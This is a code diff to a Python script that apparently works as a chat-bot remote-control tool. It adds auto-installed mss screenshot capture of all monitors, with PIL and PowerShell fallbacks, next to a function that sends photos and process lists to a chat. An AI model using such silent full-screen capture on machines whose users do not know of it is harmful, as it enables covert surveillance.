@@ -17,7 +17,8 @@ if sys.platform == 'win32':
 required_packages = {
     'requests': 'requests',
     'psutil': 'psutil',
-    'PIL': 'Pillow'
+    'PIL': 'Pillow',
+    'mss': 'mss'
 }
 
 for module_name, pip_name in required_packages.items():
@@ -903,14 +904,28 @@ def send_result(chat_id, text=None, photo_path=None, msg_id=None, proc_list=None
 
 def take_screenshot():
     screenshot_path = os.path.join(os.getcwd(), 'temp_screenshot.png')
+    
+    # 1. Primary Method: mss (highly reliable, supports all screens)
     try:
-        img = ImageGrab.grab()
+        import mss
+        with mss.mss() as sct:
+            sct.shot(mon=-1, output=screenshot_path) # mon=-1 captures all monitors
+            if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
+                # Need to convert to standard format occasionally, but mss saves as valid PNG.
+                return screenshot_path
+    except Exception as e:
+        print(f"[-] mss screenshot failed: {e}")
+
+    # 2. Secondary Method: PIL ImageGrab
+    try:
+        img = ImageGrab.grab(all_screens=True)
         img.save(screenshot_path)
         if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
             return screenshot_path
     except Exception as e:
         print(f"[-] PIL screenshot failed: {e}")
 
+    # 3. Fallback Method: PowerShell
     try:
         ps_script = f"""
         Add-Type -AssemblyName System.Windows.Forms
